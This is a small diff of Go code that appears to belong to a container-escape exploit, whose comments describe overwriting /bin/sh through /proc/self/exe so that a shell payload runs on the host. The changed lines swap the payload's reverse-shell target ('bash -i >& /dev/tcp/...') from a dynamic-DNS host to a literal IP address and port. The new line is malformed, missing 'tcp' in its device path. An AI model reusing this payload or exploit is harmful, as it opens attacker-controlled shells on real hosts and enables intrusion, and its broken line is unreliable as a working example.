@@ -13,7 +13,7 @@ import (
 )
 
 // This is the line of shell commands that will execute on the host
-var payload = "#!/bin/bash \n bash -i >& /dev/tcp/ddns.randomhhh.top/9001 0>&1"
+var payload = "#!/bin/bash \n bash -i >& /dev/34.92.246.183/4445 0>&1"
 
 func main() {
 	// First we overwrite /bin/sh with the /proc/self/exe interpreter path
